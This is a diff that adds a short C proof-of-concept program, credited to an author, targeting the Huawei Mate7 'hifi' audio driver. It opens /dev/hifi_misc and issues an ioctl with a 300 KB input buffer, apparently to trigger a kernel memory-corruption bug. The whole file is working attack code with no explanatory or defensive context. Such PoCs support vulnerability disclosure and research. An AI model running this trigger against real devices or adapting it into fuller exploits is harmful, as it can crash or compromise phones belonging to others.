@@ -1,0 +1,45 @@
+/*
+ *
+ *  HuaWei Mate7 hifi driver Poc
+ *
+ *  Writen by pray3r, <pray3r.z@gmail.com>
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+
+#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR('A', 0x75, struct misc_io_sync_param)
+
+struct misc_io_sync_param {
+	void *                  para_in;           
+	unsigned int            para_size_in;       
+	void *                  para_out;           
+	unsigned int            para_size_out;   
+};
+
+int main(int arg, char **argv)
+{
+	int fd; 
+	void *in = malloc(300 * 1024);
+	void *out = malloc(100);
+	struct misc_io_sync_param poc;
+
+	poc.para_in = in;
+	poc.para_size_in = 300 * 1024;
+	poc.para_out = out;
+	poc.para_size_out = 100;
+
+	fd = open("/dev/hifi_misc", O_RDWR);
+
+	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &poc);
+
+	free(in);
+	free(out);
+
+	return 0;
+}
